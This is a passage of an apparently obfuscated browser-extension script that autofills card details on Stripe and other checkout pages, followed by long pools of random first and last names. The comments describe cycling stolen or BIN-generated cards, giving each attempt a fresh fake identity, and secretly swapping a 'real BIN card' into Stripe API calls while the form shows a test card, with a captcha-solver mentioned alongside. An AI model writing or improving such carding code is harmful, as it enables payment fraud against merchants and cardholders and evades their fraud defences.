      _semexShowUpdateBanner(_semexUp.semexUpgradeRequired);
      console.warn("[SEMEX/content] form fill BLOCKED — extension is outdated");
      try {
        window.postMessage({ type: "SEMEX_FILL_FORM_COMPLETE", ok: false, error: "extension_outdated" }, "*");
      } catch (_e) {}
      return;
    }
  } catch (_e) {}
  var _0xed5222;
  var _0x1222f8;
  var _0xf11480;
  var _0x448fcb;
  var _0x3913e2;
  var _0x3a5b6b;
  var _0x2b32ff;
  var _0xdcfe8d;
  var _0x2186d5;
  var _0x535d24;
  var _0x20f8ef;
  const _0x42c9ea = Date.now();
  const _0x2322af = window.location.href;
  // Dedupe/debounce must be per (page, card) — NOT per page — or card cycling on
  // a single-URL inbuilt checkout (the URL never changes between attempts)
  // silently reuses the first card: the page got marked "filled" and every later
  // attempt reported success WITHOUT filling the new card. Fingerprint the card
  // so a different card is always treated as a brand-new attempt.
  const _semexCardFp = (_0x395d27 && _0x395d27.number)
    ? String(_0x395d27.number).replace(/\s/g, "") + "|" +
      String(_0x395d27.month || _0x395d27.exp_month || "") + "|" +
      String(_0x395d27.year || _0x395d27.exp_year || "") + "|" +
      String(_0x395d27.cvv || _0x395d27.cvc || "")
    : "nocard";
  const _semexFillKey = _0x2322af + "::" + _semexCardFp;
  window.__SEMEX_FILLED_PAGES = window.__SEMEX_FILLED_PAGES || new Set();
  // Debounce ONLY an identical (page+card) request fired twice inside the window.
  // A different card = a new attempt and must never be dropped (that was the
  // "autofill works sometimes" cascade). Never leave the overlay hanging on
  // "Waiting response..." either — its 15s timeout burns a whole attempt: if the
  // same card already finished filling moments ago the form still holds it, so
  // acknowledge success; if an identical fill is still IN FLIGHT, stay silent and
  // let that one post its own completion (avoid an early submit of a half-filled
  // form).
  if (_semexFillKey === window.__SEMEX_LAST_FILL_KEY && _0x42c9ea - lastFormFillTime < FORM_FILL_DEBOUNCE) {
    if (window.__SEMEX_FILL_DONE_KEY === _semexFillKey) {
      try { window.postMessage({ type: "SEMEX_FILL_FORM_COMPLETE", ok: true, dedupe: true }, "*"); } catch (_eDb) {}
    }
    return;
  }
  lastFormFillTime = _0x42c9ea;
  window.__SEMEX_LAST_FILL_KEY = _semexFillKey;
  if (window.__SEMEX_FILLED_PAGES.has(_semexFillKey)) {
    window.postMessage({
      type: "SEMEX_FILL_FORM_COMPLETE",
      ok: true
    }, "*");
    return;
  }
  try {
    if (_0x395d27 && _0x395d27.number) {
      window.postMessage({
        type: "SET_CARD_DATA",
        card: _0x395d27
      }, "*");
      // Broadcast real BIN card to MAIN-world interceptor so it can swap it
      // into the Stripe API call while the visible form shows a test card.
      window.postMessage({
        type: "SEMEX_SET_PENDING_CARD",
        card: _0x395d27
      }, "*");
    }
    let _0x1d29ad = false;
    // TIMEOUT GUARD: a wedged extension messaging channel must not pin the
    // fill on "Filling form..." — fall through to the config-refetch path.
    let _0xf0e2e7 = await Promise.race([
      safeSendMessage({
        type: "GET_CACHED_FORM_DATA",
        // Domain-scope the lookup: the prefetch buffer holds a STRIPE-generic
        // profile; serving it on Whop (Basis Theory) fills nothing but the
        // luckily-shared #cardNumber/#cvc ids (verified live 2026-10-12).
        domain: window.location.hostname
      }),
      new Promise(_r => setTimeout(() => _r(null), 5000))
    ]);
    // FIX (autofill-on-Start race): on the first Start the form/config cache is
    // often empty because instructions haven't been fetched yet (a page reload
    // "worked" only because it gave the config time to load). Trigger the config
    // fetch and poll the cache a few times before giving up, so Start autofills
    // reliably without needing a manual reload.
    if (!(_0xf0e2e7 && _0xf0e2e7.success && _0xf0e2e7.data)) {
      try {
        safeSendMessage({
          type: "CHECK_CONFIG",
          domain: window.location.hostname,
          isStripeCheckout: window.IS_STRIPE_CHECKOUT || window.location.hostname === "checkout.stripe.com",
          force: true,
          card: _0x395d27 || null
        });
      } catch (e) {}
      // 13 × 120ms ≈ 1.56s total deadline — same coverage as the old
      // 6 × 250ms window, but polls more than twice as fast.
      for (let _0xretry = 0; _0xretry < 13; _0xretry++) {
        await new Promise(_0xr => setTimeout(_0xr, 120));
        _0xf0e2e7 = await safeSendMessage({ type: "GET_CACHED_FORM_DATA", domain: window.location.hostname });
        if (_0xf0e2e7 && _0xf0e2e7.success && _0xf0e2e7.data) break;
      }
    }
    if (_0xf0e2e7 && _0xf0e2e7.success && _0xf0e2e7.data) {
      // SEMEX: only fill on checkout pages — never on login/contact/newsletter pages.
      // sessionStorage key is written by interceptor.js (MAIN world) when a Stripe
      // checkout is detected; the hostname list covers Stripe-hosted pages directly.
      const _semexIsCheckoutFill = (function() {
        try { if (sessionStorage.getItem("IS_STRIPE_CHECKOUT") === "true") return true; } catch (_e) {}
        const _h = (window.location.hostname || "").toLowerCase();
        if (["checkout.stripe.com", "pay.stripe.com", "buy.stripe.com", "donate.stripe.com",
             "invoice.stripe.com", "billing.stripe.com", "pay.openai.com"].includes(_h)) return true;
        // Pixel Zero parity: ANY page whose URL carries a Stripe Checkout
        // Session id (cs_live_/cs_test_) or the /checkout/session/ path is a
        // checkout regardless of host naming.
        const _semexFullHref = (window.location.href || "").toLowerCase();
        if (_semexFullHref.includes("cs_live_") || _semexFullHref.includes("cs_test_") || _semexFullHref.includes("/checkout/session/")) return true;
        // Embedded Stripe Payment Element on a merchant page: the Stripe form
        // lives in a cross-origin js.stripe.com iframe so IS_STRIPE_CHECKOUT is
        // set in the iframe's sessionStorage (different origin), never in the
        // top frame's. Detect it by the iframe's presence instead.
        try {
          // Require an ACTUAL card/checkout iframe (elements-inner or embedded-checkout-inner),
          // not just the Stripe.js controller frame that fires on any site loading Stripe.js.
          if (Array.from(document.querySelectorAll("iframe")).some(function(_semexFr2){
            const _s2 = _semexFr2.src || "";
            return _s2.includes("js.stripe.com") && (_s2.includes("elements-inner") || _s2.includes("embedded-checkout-inner"));
          })) return true;
        } catch(_e2) {}
        // Non-Stripe gateways: only fill on actual payment pages, never homepages.
        const _p = (window.location.pathname || "").toLowerCase();
        if (_h.includes("checkoutshopper")) return true; // Adyen hosted
        const _payish = /\/(c\/pay|pay|checkout|payment|purchase|buy|subscribe|subscription|hpp|paystation)/.test(_p);
        if (_h.includes("adyen.com")) return _payish;
        if (_h.includes("checkout.com")) return _h.startsWith("pay.") || _payish;
        if (_h.includes("recurly.com")) return _payish;
        if (_h.includes("xsolla.com")) return _h.startsWith("secure.") || _h.startsWith("pay.") || _payish;
        if (_h.includes("roblox.com")) return /\/(upgrades|payment|purchase|transactions|premium)/.test(_p);
        if (_h.includes("epicgames.com")) return _payish;
        // Whop checkout (/checkout/plan_*): card fields are Basis Theory hosted
        // iframes (js.basistheory.com), NOT Stripe — the js.stripe.com probe
        // above never fires here. Path check keeps fills off whop.com homepages.
        if (_h.includes("whop.com")) return _payish;
        // Basis Theory hosted-element iframes exist ONLY as payment-field hosts
        // (one card input per frame) — always a checkout context. Without this
        // the FILL_FORM delivery to Whop's card frames is gate-blocked.
        if (_h.includes("basistheory.com")) return true;
        return false;
      })();
      if (!_semexIsCheckoutFill) {
        // Silent returns leave the overlay stuck on "Waiting response...".
        try { window.postMessage({ type: "SEMEX_FILL_FORM_COMPLETE", ok: false, error: "not_checkout" }, "*"); } catch (_eNC2) {}
        return;
      }
      const _0x545bc6 = _0xf0e2e7.data;
      // FIX (random name/email never applied): content.js runs in the ISOLATED
      // world — window.__extensionSettings is only set by MAIN-world scripts
      // (overlay.js / captcha-solver.js), so it was always {} here and the
      // Random Name/Email toggles silently did nothing on checkout fills.
      // Read settings straight from chrome.storage instead.
      // TIMEOUT GUARD: never let a storage read stall the fill pipeline.
      // Timeout → last-known-good cache, not empty defaults.
      let _0x4159f5 = await Promise.race([
        new Promise(_res => {
          try {
            chrome.storage.local.get(["settings"], _r => _res((_r && _r.settings) || {}));
          } catch (_e) { _res({}); }
        }),
        new Promise(_res => setTimeout(() => _res(null), 1500))
      ]);
      if (_0x4159f5 === null) _0x4159f5 = _semexSettingsCache || {};
      else _semexSettingsCache = _0x4159f5;
      const _0x4e07a9 = _0x4159f5.formFilling || {};
      // Random name/email pools — a fresh pick happens on every fill call, so
      // each card attempt gets a different identity ("RND = per card").
      const _SEMEX_RND_FIRST = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles","Daniel","Matthew","Anthony","Mark","Donald","Steven","Paul","Andrew","Joshua","Kevin","Brian","George","Timothy","Ronald","Edward","Jason","Jeffrey","Ryan","Jacob","Gary","Nicholas","Eric","Jonathan","Stephen","Larry","Justin","Scott","Brandon","Benjamin","Samuel","Raymond","Gregory","Frank","Alexander","Patrick","Jack","Dennis","Jerry","Tyler","Aaron","Jose","Adam","Nathan","Henry","Douglas","Zachary","Peter","Kyle","Noah","Ethan","Jeremy","Walter","Christian","Keith","Roger","Terry","Austin","Sean","Gerald","Carl","Harold","Dylan","Arthur","Lawrence","Jordan","Jesse","Bryan","Billy","Bruce","Gabriel","Joe","Logan","Alan","Juan","Wayne","Ralph","Roy","Eugene","Randy","Vincent","Russell","Louis","Philip","Bobby","Johnny","Bradley","Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen","Lisa","Nancy","Betty","Margaret","Sandra","Ashley","Kimberly","Emily","Michelle","Dorothy","Amanda","Melissa","Deborah","Stephanie","Rebecca","Sharon","Laura","Cynthia","Amy","Angela","Kathleen","Shirley","Anna","Brenda","Pamela","Nicole","Emma","Samantha","Katherine","Christine","Debra","Rachel","Carolyn","Janet","Maria","Heather","Diane","Julie","Joyce","Victoria","Ruth","Virginia","Lauren","Kelly","Christina","Joan","Evelyn","Judith","Andrea","Hannah","Megan","Cheryl","Jacqueline","Martha","Madison","Teresa","Gloria","Sara","Janice","Ann","Abigail","Sophia","Frances","Jean","Alice","Judy","Isabella","Julia","Grace","Amber","Denise","Danielle","Marilyn","Beverly","Charlotte","Natalie","Theresa","Diana","Brittany","Doris","Kayla","Alexis","Lori","Marie","Mia","Olivia","Ava","Chloe","Ella","Lily","Zoe","Sofia","Avery","Eleanor","Scarlett","Aria","Penelope","Layla","Nora","Camila","Luna","Savannah","Brooklyn","Bella","Claire","Skylar","Lucy","Paisley","Everly","Riley","Aubrey","Stella","Aurora","Naomi","Maya","Willow","Kinsley","Aaliyah","Elena","Ariana","Allison","Gabriella","Valerie","Adriana","Alexandra","Catherine","Vanessa","Jade","Kylie","Gabrielle","Jasmine","Melanie","Kennedy","Tiffany","Cassandra","Crystal","Alicia","Holly","Veronica","Lydia","Erin","Courtney","Heidi","Kristen","Caitlin","Alexa","Monica","Sabrina","Miranda","Karina","Bridget","Bianca","Sierra","Chelsea","Megan","Rachel","Caroline","Valeria","Camille","Daisy","Ivy","Harper","Lillian","Aubree","Addison","Mila","Eliana","Sadie","Nevaeh","Mackenzie","Autumn","Piper","Ruby","Serenity","Alice","Eva","Clara","Vivian","Madelyn","Liliana","Audrey","Bella","Natalia","Genesis","Hailey","Kaylee","Sophie","Leah","Adeline","Arianna","Caroline","Nova","Emilia","Kennedy","Samantha","Maya","Willow","Kinsley","Naomi","Aaliyah","Elena","Sarah","Ariana","Allison","Gabriella","Connor","Liam","Mason","Lucas","Oliver","Elijah","Aiden","Carter","Sebastian","Wyatt","Julian","Levi","Isaiah","Landon","Hunter","Cameron","Josiah","Isaiah","Adrian","Colton","Jordan","Brayden","Dominic","Austin","Ian","Adam","Elias","Jaxson","Greyson","Jose","Ezra","Carson","Evan","Maverick","Bryson","Juan","Charles","Kai","Cooper","Roman","Jason","Sawyer","Gavin","Miles","Micah","Vincent","Damian","Kingston","Leonardo","Kai","Weston","Wesley","Hudson","Asher","Declan","Rowan","Theo","Beau","Felix","Omar","Tristan","Brandon","Kevin","Zachary","Tyler","Aaron","Charles","Caleb","Ryan","Nathan","Hunter","Christian","Jonathan","Levi","Landon","Aaron","Charles","Thomas","Connor","Jeremiah","Cameron","Josiah","Adrian","Colton","Jordan","Brayden","Dominic","Austin","Ian","Adam","Elias","Jaxson","Greyson","Jose","Ezra","Carson","Evan","Maverick","Bryson","Juan","Mateo","Diego","Santiago","Miguel","Alejandro","Rafael","Eduardo","Fernando","Ricardo","Marco","Raul","Hector","Oscar","Andres","Javier","Pedro","Luis","Carlos","Manuel","Francisco","Roberto","Antonio","Mario","Francisco","Jorge","Alberto","Sergio","Pablo","Enrique","Ramiro","Cesar","Arturo","Alfonso","Guillermo","Ignacio","Emilio","Salvador","Ricardo","Felipe","Gabriel","Ernesto","Jaime","Marco","Hugo","Cristian","Alexis","Armando","Esteban","Bruno","Martin","Rodrigo","Saul","Ruben","Israel","Edgar","Gerardo","Rodrigo","Maximiliano","Thiago","Benjamin","Agustin","Facundo","Matias","Nicolas","Santino","Valentino","Lorenzo","Emiliano","Franco","Bautista","Bastian","Bruno","Dante","Elian","Gael","Gonzalo","Ian","Ignacio","Iker","Joaquin","Julian","Lautaro","Leandro","Luciano","Marcos","Mauricio","Nicolas","Oliver","Pablo","Rafael","Rodrigo","Santiago","Sebastian","Simon","Tomas","Valentin","Vicente","Emma","Olivia","Sophia","Isabella","Mia","Charlotte","Amelia","Harper","Evelyn","Abigail","Emily","Elizabeth","Mila","Ella","Avery","Sofia","Camila","Aria","Scarlett","Victoria","Madison","Luna","Grace","Chloe","Penelope","Layla","Riley","Zoey","Nora","Lily","Eleanor","Hannah","Lillian","Addison","Aubrey","Ellie","Stella","Natalie","Zoe","Leah","Hazel","Violet","Aurora","Savannah","Audrey","Brooklyn","Bella","Claire","Skylar","Lucy","Paisley","Everly","Anna","Caroline","Nova","Genesis","Emilia","Kennedy","Samantha","Maya","Willow","Kinsley","Naomi","Aaliyah","Elena","Sarah","Ariana","Allison","Gabriella","Alice","Madelyn","Cora","Ruby","Eva","Serenity","Autumn","Adeline","Hailey","Gianna","Valentina","Isla","Eliana","Quinn","Nevaeh","Ivy","Sadie","Piper","Lydia","Alexa","Josephine","Emery","Julia","Delilah","Arianna","Vivian","Kaylee","Sophie","Brielle","Madeline","Peyton","Rylee","Clara","Hadley","Melanie","Mackenzie","Reagan","Adalynn","Liliana","Aubree","Jade","Katherine","Isabelle","Natalia","Raelynn","Maria","Athena","Ximena","Arya","Leilani","Taylor","Faith","Rose","Kylie","Alexandra","Mary","Margaret","Lyla","Ashley","Amaya","Eliza","Brianna","Bailey","Andrea","Khloe","Jasmine","Melody","Iris","Isabel","Norah","Annabelle","Valeria","Emerson","Adalyn","Ryleigh","Eden","Emersyn","Anastasia","Kayla","Alyssa","Juliana","Charlie","Esther","Ariel","Cecilia","Valerie","Alina","Molly","Reese","Aliyah","Lilly","Parker","Finley","Morgan","Sydney","Jordyn","Eloise","Trinity","Daisy","Kimberly","Lauren","Genevieve","Sara","Arabella","Harmony","Remi","Teagan","Alexis","London","Sloane","Laila","Lucia","Diana","Juliette","Sienna","Elliana","Lucille","Ayla","Alana","Michelle","Daniela","Brooke","Elaina","Rosalie","Madilyn","Kendall","Camille","Juniper","Brynlee","Hope","Josie","Raegan","Milly","Blakely","Mariana","Leia","Amina","Freya","Mabel","Alexandria","Kate","Charlee","Mira","Callie","Marina","Cali","Lena","Lily","Lilliana","Vanessa","Eva","Nadia","Alayna","Nyla","Eliza","Felicity","Gracelyn","Jocelyn","Selah","Makayla","Regina","Kira","Delaney","Margot","Everleigh","Aitana","Maddison","Aniyah","Katherine","Olive","Aylin","Gia","Averie","Skye","Blake","Ruth","Helena","Amy","Angela","Lila","Luna","Alessandra","Cataleya","Adaline","Aviana","Elsie","Ember","Sylvie","Camryn","Adelyn","Remington","Noa","Magnolia","Aspen","Kamila","Aileen","Briella","Madeleine","Tatum","Adelynn","Collins","Gracie","Izabella","Kenley","Anne","Ana","Vera","Zara","Emmy","Mallory","Leila","Francesca","Amari","Elle","Aurelia","Henley","Briana","Melissa","Daleyza","Journee","Ariella","Danielle","Myla","Alena","Alani","Angelina","Joy","Reyna","Oakley","Kelsey","Kalani","Amira","Celeste","Daphne","Hattie","Leona","Mariam","Winter","Astrid","Bailee","Charli","Demi","Gwendolyn","Indie","Jessie","Kassidy","Lorelai","Meadow","Nataly","Opal","Paloma","Queen","Raina","Salem","Tessa","Ursula","Vada","Winnie","Ximena","Yaretzi","Zelda","Anya","Bexley","Clementine","Davina","Elowen","Faye","Gemma","Harlow","Imogen","Jolene","Kaia","Lux","Maren","Noor","Odessa","Primrose","Renata","Salem","Talia","Una","Veda","Wren","Xochitl","Yasmin","Zuri","Amara","Blair","Cleo","Dahlia","Esme","Fiona","Giselle","Harriet","Ines","Juno","Kora","Lenora","Magnolia","Nell","Octavia","Persephone","Rosalind","Sabina","Tamsin","Uma","Vesper","Willa","Xanthe","Yara","Zinnia","Althea","Blythe","Cosima","Delphine","Eulalia","Faustine","Ginevra","Honora","Isadora","Jessamine","Kalliope","Lavinia","Minerva","Nerissa","Olympia","Petra","Quintessa","Rhea","Seraphina","Theodora","Ursuline","Vivienne","Wilhelmina","Xenia","Ysabel","Zephyrine"];
      const _SEMEX_RND_LAST = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores","Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts","Gomez","Phillips","Evans","Turner","Diaz","Parker","Cruz","Edwards","Collins","Reyes","Stewart","Morris","Morales","Murphy","Cook","Rogers","Gutierrez","Ortiz","Morgan","Cooper","Peterson","Bailey","Reed","Kelly","Howard","Ramos","Kim","Cox","Ward","Richardson","Watson","Brooks","Chavez","Wood","James","Bennett","Gray","Mendoza","Ruiz","Hughes","Price","Alvarez","Castillo","Sanders","Patel","Myers","Long","Ross","Foster","Jimenez","Powell","Jenkins","Perry","Russell","Sullivan","Bell","Coleman","Butler","Henderson","Barnes","Gonzales","Fisher","Vasquez","Simmons","Romero","Jordan","Patterson","Alexander","Hamilton","Graham","Wallace","Griffin","Diaz","Hayes","Myers","Ford","Hamilton","Graham","Sullivan","Wallace","Woods","Cole","West","Jordan","Owens","Reynolds","Fisher","Ellis","Harrison","Gibson","Mcdonald","Cruz","Marshall","Ortiz","Gomez","Murray","Freeman","Wells","Webb","Simpson","Stevens","Tucker","Porter","Hunter","Hicks","Crawford","Henry","Boyd","Mason","Morales","Kennedy","Warren","Dixon","Ramos","Reyes","Burns","Gordon","Shaw","Holmes","Rice","Robertson","Hunt","Black","Daniels","Palmer","Mills","Nichols","Grant","Knight","Ferguson","Rose","Stone","Hawkins","Dunn","Perkins","Hudson","Spencer","Gardner","Stephens","Payne","Pierce","Berry","Matthews","Arnold","Wagner","Willis","Ray","Watkins","Olson","Carroll","Duncan","Snyder","Hart","Cunningham","Bradley","Lane","Andrews","Ruiz","Harper","Fox","Riley","Armstrong","Carpenter","Weaver","Greene","Lawrence","Elliott","Chavez","Sims","Austin","Peters","Kelley","Franklin","Lawson","Fields","Gutierrez","Ryan","Schmidt","Carr","Vasquez","Castillo","Wheeler","Chapman","Oliver","Montgomery","Richards","Williamson","Johnston","Banks","Meyer","Bishop","Mccoy","Howell","Alvarez","Morrison","Hansen","Fernandez","Garza","Harvey","Little","Burton","Stanley","Nguyen","George","Jacobs","Reid","Kim","Fuller","Lynch","Dean","Gilbert","Garrett","Romero","Welch","Larson","Frazier","Burke","Hanson","Day","Mendoza","Moreno","Bowman","Medina","Fowler","Brewer","Hoffman","Carlson","Silva","Pearson","Holland","Douglas","Fleming","Jensen","Vargas","Byrd","Davidson","Hopkins","May","Terry","Herrera","Wade","Soto","Walters","Curtis","Neal","Caldwell","Lowe","Jennings","Barnett","Graves","Jimenez","Horton","Shelton","Barrett","Obrien","Castro","Sutton","Gregory","Mckinney","Lucas","Miles","Craig","Rodriquez","Chambers","Holt","Lambert","Fletcher","Watts","Bates","Hale","Rhodes","Pena","Beck","Newman","Haynes","Mcdaniel","Mendez","Bush","Vaughn","Parks","Dawson","Santiago","Norris","Hardy","Love","Steele","Curry","Powers","Schultz","Barker","Guzman","Page","Munoz","Ball","Keller","Chandler","Weber","Leonard","Walsh","Lyons","Ramsey","Wolfe","Schneider","Mullins","Benson","Sharp","Bowen","Daniel","Barber","Cummings","Hines","Baldwin","Griffith","Valdez","Hubbard","Salazar","Reeves","Warner","Stevenson","Burgess","Santos","Tate","Cross","Garner","Mann","Mack","Moss","Thornton","Dennis","Mcgee","Farmer","Delgado","Aguilar","Vega","Glover","Manning","Cohen","Harmon","Rodgers","Robbins","Newton","Todd","Blair","Higgins","Ingram","Reese","Cannon","Strickland","Townsend","Potter","Goodwin","Walton","Rowe","Hampton","Ortega","Patton","Swanson","Joseph","Francis","Goodman","Maldonado","Yates","Becker","Erickson","Hodges","Rios","Conner","Adkins","Webster","Norman","Malone","Hammond","Flowers","Cobb","Moody","Quinn","Blake","Maxwell","Pope","Floyd","Osborne","Paul","Mccarthy","Guerrero","Lindsey","Estrada","Sandoval","Gibbs","Tyler","Gross","Fitzgerald","Stokes","Doyle","Sherman","Saunders","Wise","Colon","Gill","Alvarado","Greer","Padilla","Simon","Waters","Nunez","Ballard","Schwartz","Mcbride","Houston","Christensen","Klein","Pratt","Briggs","Parsons","Mclaughlin","Zimmerman","French","Buchanan","Moran","Copeland","Roy","Pittman","Brady","Mccormick","Holloway","Brock","Poole","Frank","Logan","Owen","Bass","Marsh","Drake","Wong","Jefferson","Park","Morton","Abbott","Sparks","Patrick","Norton","Huff","Clayton","Massey","Lloyd","Figueroa","Carson","Bowers","Roberson","Barton","Tran","Lamb","Harrington","Casey","Boone","Cortez","Clarke","Mathis","Singleton","Wilkins","Cain","Bryan","Underwood","Hogan","Mckenzie","Collier","Luna","Phelps","Mcguire","Allison","Bridges","Wilkerson","Nash","Summers","Atkins","Wilcox","Pitts","Conley","Marquez","Burnett","Richard","Cochran","Chase","Davenport","Hood","Gates","Clay","Ayala","Sawyer","Roman","Vazquez","Dickerson","Hodge","Acosta","Flynn","Espinoza","Nicholson","Monroe","Wolf","Morrow","Kirk","Randall","Anthony","Whitaker","Oconnor","Skinner","Ware","Molina","Kirby","Huffman","Bradford","Charles","Gilmore","Dominguez","Oneal","Bruce","Lang","Combs","Kramer","Heath","Hancock","Gallagher","Gaines","Shaffer","Short","Wiggins","Mathews","Mcclain","Fischer","Wall","Small","Melton","Hensley","Bond","Dyer","Cameron","Grimes","Contreras","Christian","Wyatt","Baxter","Snow","Mosley","Shepherd","Larsen","Hoover","Beasley","Glenn","Petersen","Whitehead","Meyers","Keith","Garrison","Vincent","Shields","Horn","Savage","Olsen","Schroeder","Hartman","Woodard","Mueller","Kemp","Deleon","Booth","Patel","Calhoun","Wiley","Eaton","Cline","Navarro","Harrell","Lester","Humphrey","Parrish","Duran","Hutchinson","Hess","Dorsey","Bullock","Robles","Beard","Dalton","Avila","Vance","Rich","Blackwell","York","Johns","Blankenship","Trevino","Salinas","Campos","Pruitt","Moses","Callahan","Golden","Montoya","Hardin","Guerra","Mcdowell","Carey","Stafford","Gallegos","Henson","Wilkinson","Booker","Merritt","Miranda","Atkinson","Orr","Decker","Hobbs","Preston","Tanner","Knox","Pacheco","Stephenson","Glass","Rojas","Serrano","Marks","Hickman","English","Sweeney","Strong","Prince","Mcclure","Conway","Walter","Roth","Maynard","Farrell","Lowery","Hurst","Nixon","Weiss","Trujillo","Ellison","Sloan","Juarez","Winters","Mclean","Randolph","Leon","Boyer","Villarreal","Mccall","Gentry","Carrillo","Kent","Ayers","Lara","Shannon","Sexton","Pace","Hull","Leblanc","Browning","Velasquez","Leach","Chang","House","Sellers","Herring","Noble","Foley","Bartlett","Mercado","Landry","Durham","Walls","Barr","Mckee","Bauer","Rivers","Everett","Bradshaw","Pugh","Velez","Rush","Estes","Dodson","Morse","Sheppard","Weeks","Camacho","Bean","Barron","Livingston","Middleton","Spears","Branch","Blevins","Chen","Kerr","Mcconnell","Hatfield","Harding","Ashley","Solis","Herman","Frost","Giles","Blackburn","William","Pennington","Woodward","Finley","Mcintosh","Koch","Best","Solomon","Mccullough","Dudley","Nolan","Blanchard","Rivas","Brennan","Mejia","Kane","Benton","Joyce","Buckley","Haley","Valentine","Maddox","Russo","Mcknight","Buck","Moon","Mcmillan","Crosby","Berg","Dotson","Mays","Roach","Church","Chan","Richmond","Meadows","Faulkner","Oneill","Knapp","Kline","Barry","Ochoa","Jacobson","Gay","Avery","Hendricks","Horne","Shepard","Hebert","Cherry","Cardenas","Mcintyre","Whitney","Waller","Holman","Donaldson","Cantu","Terrell","Morin","Gillespie","Fuentes","Tillman","Sanford","Bentley","Peck","Key","Salas","Rollins","Gamble","Dickson","Battle","Santana","Cabrera","Cervantes","Howe","Hinton","Hurley","Spence","Zamora","Yang","Mcneil","Suarez","Case","Petty","Gould","Mcfarland","Sampson","Carver","Bray","Rosario","Macdonald","Stout","Hester","Melendez","Dillon","Farley","Hopper","Galloway","Potts","Bernard","Joyner","Stein","Aguirre","Osborn","Mercer","Bender","Franco","Rowland","Sykes","Benjamin","Travis","Pickett","Crane","Sears","Mayo","Dunlap","Hayden","Wilder","Mckay","Coffey","Mccarty","Ewing","Cooley","Vaughan","Bonner","Cotton","Holder","Stark","Ferrell","Cantrell","Fulton","Lynn","Lott","Calderon","Rosa","Pollard","Hooper","Burch","Mullen","Fry","Riddle","Levy","David","Duke","Odonnell","Guy","Michael","Britt","Frederick","Daugherty","Berger","Dillard","Alston","Jarvis","Frye","Riggs","Chaney","Odom","Duffy","Fitzpatrick","Valenzuela","Merrill","Mayer","Alford","Mcpherson","Acevedo","Donovan","Barrera","Albert","Cote","Reilly","Compton","Raymond","Mooney","Mcgowan","Craft","Cleveland","Clemons","Wynn","Nielsen","Baird","Stanton","Snider","Rosales","Bright","Witt","Stuart","Hays","Holden","Rutledge","Kinney","Clements","Castaneda","Slater","Hahn","Emerson","Conrad","Burks","Delaney","Pate","Lancaster","Sweet","Justice","Tyson","Sharpe","Whitfield","Talley","Macias","Irwin","Burris","Ratliff","Mccray","Madden","Kaufman","Beach","Goff","Cash","Bolton","Mcfadden","Levine","Good","Byers","Kirkland","Kidd","Workman","Carney","Dale","Mcleod","Holcomb","England","Finch","Head","Burt","Hendrix","Sosa","Haney","Franks","Sargent","Nieves","Downs","Rasmussen","Bird","Hewitt","Lindsay","Le","Foreman","Valencia","Oneil","Delacruz","Vinson","Dejesus","Hyde","Forbes","Gilliam","Guthrie","Wooten","Huber","Barlow","Boyle","Mcmahon","Buckner","Rocha","Puckett","Langley","Knowles","Cooke","Velazquez","Whitley","Noel","Vang","Silva","Medeiros","Souza","Oliveira","Pereira","Costa","Santos","Rodrigues","Ferreira","Almeida","Carvalho","Gomes","Martins","Araujo","Barbosa","Ribeiro","Alves","Cardoso","Schmidt","Schneider","Fischer","Weber","Meyer","Wagner","Becker","Hoffmann","Schulz","Koch","Bauer","Richter","Klein","Wolf","Neumann","Schwarz","Zimmermann","Braun","Krause","Hofmann","Hartmann","Lange","Schmitt","Werner","Schmitz","Krause","Meier","Lehmann","Schmid","Schulze","Maier","Kohler","Herrmann","Konig","Walter","Mayer","Huber","Kaiser","Fuchs","Peters","Lang","Scholz","Moller","Weiss","Jung","Hahn","Schubert","Vogel","Friedrich","Keller","Gunther","Frank","Berger","Winkler","Roth","Beck","Lorenz","Baumann","Franke","Albrecht","Schuster","Simon","Ludwig","Bohm","Winter","Kraus","Martin","Schumacher","Krämer","Vogt","Stein","Jager","Otto","Sommer","Gross","Seidel","Heinrich","Brandt","Haas","Schreiber","Graf","Schulte","Dietrich","Kuhn","Ziegler","Kuhn","Pfeiffer","Engel","Horn","Busch","Bergmann","Thomas","Voigt","Sauer","Arnold","Wolff","Pohl","Martin","Moreau","Laurent","Simon","Michel","Lefebvre","Leroy","Roux","David","Bertrand","Morel","Fournier","Girard","Bonnet","Dupont","Lambert","Fontaine","Rousseau","Vincent","Muller","Lefevre","Faure","Andre","Mercier","Blanc","Guerin","Boyer","Garnier","Chevalier","Francois","Legrand","Gauthier","Garcia","Perrin","Robin","Clement","Mathieu","Picard","Gautier","Roche","Roy","Noel","Meyer","Lucas","Meunier","Jean","Dupuy","Galland","Petit","Durand","Leroux","Moreno","Colin","Fernandez","Leclerc","Philippe","Bourgeois","Renaud","Martinez","Perrot","Dubois","Marchand","Picard","Leclercq","Payet","Rolland","Lecomte","Lopez","Vidal","Lejeune","Dufour","Poirier","Charpentier","Caron","Brun","Rossi","Russo","Ferrari","Esposito","Bianchi","Romano","Colombo","Ricci","Marino","Greco","Bruno","Gallo","Conti","De Luca","Mancini","Costa","Giordano","Rizzo","Lombardi","Moretti","Barbieri","Fontana","Santoro","Mariani","Rinaldi","Caruso","Ferrara","Galli","Martini","Leone","Longo","Gentile","Martinelli","Vitale","Lombardo","Serra","Coppola","De Santis","D'Angelo","Marchetti","Parisi","Villa","Conte","Ferraro","Ferri","Fabbri","Bianco","Marini","Grasso","Valentini","Messina","Sala","De Angelis","Gatti","Pellegrini","Palumbo","Sanna","Farina","Rizzi","Monti","Cattaneo","Morelli","Amato","Silvestri","Mazza","Testa","Grassi","Pellegrino","Carbone","Giuliani","Benedetti","Barone","Rossetti","Caputo","Montanari","Guerra","Palmieri","Bernardi","Martino","Fiore","De 